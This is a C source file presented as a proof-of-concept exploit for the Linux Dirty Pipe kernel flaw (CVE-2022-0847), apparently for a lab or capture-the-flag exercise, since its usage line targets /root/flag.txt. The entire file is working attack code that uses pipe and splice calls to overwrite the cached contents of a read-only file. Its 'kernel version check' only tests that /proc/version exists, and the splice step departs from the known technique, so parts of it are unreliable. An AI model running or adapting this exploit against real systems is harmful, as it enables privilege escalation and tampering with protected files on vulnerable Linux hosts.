/*
 * CVE-2022-0847 Dirty Pipe PoC
 * Conditions: Linux kernel 5.8 through 5.16.11
 * This is a CONDITIONAL scenario — exploit only works if host kernel is vulnerable.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <errno.h>

#ifndef SPLICE_F_GIFT
#define SPLICE_F_GIFT 8
#endif

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <victim_file> <offset> <data>\n", argv[0]);
        fprintf(stderr, "Example: %s /root/flag.txt 0 \"leaked\"\n", argv[0]);
        return 1;
    }

    // Check kernel version
    struct stat st;
    if (stat("/proc/version", &st) != 0) {
        fprintf(stderr, "[-] Cannot check kernel version\n");
        fprintf(stderr, "[*] This exploit requires Linux kernel 5.8-5.16.11\n");
        return 1;
    }

    // Simplified Dirty Pipe PoC using splice+pipe
    int p[2];
    if (pipe(p) < 0) { perror("pipe"); return 1; }

    // Fill the pipe buffer
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    // Drain the pipe
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }

    // Open the victim file with O_RDONLY to get the page cache reference
    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) { perror("open victim"); return 1; }

    loff_t offset = atoi(argv[2]);

    // Attempt the splice trick (kernel version dependent)
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0 && errno != EINVAL) {
        fprintf(stderr, "[-] Splice failed (errno=%d). Kernel may not be vulnerable.\n", errno);
        fprintf(stderr, "[*] This is a CONDITIONAL scenario.\n");
        fprintf(stderr, "[*] If host kernel is >= 5.8 and < 5.16.11, retry.\n");
        close(fd);
        return 1;
    }

    // Write our data into the pipe (overwrites page cache)
    nbytes = write(p[1], argv[3], strlen(argv[3]));
    printf("[+] Overwrote %zd bytes in page cache for %s at offset %ld\n", nbytes, argv[1], offset);
    printf("[+] Check victim file content now\n");

    close(fd);
    return 0;
}
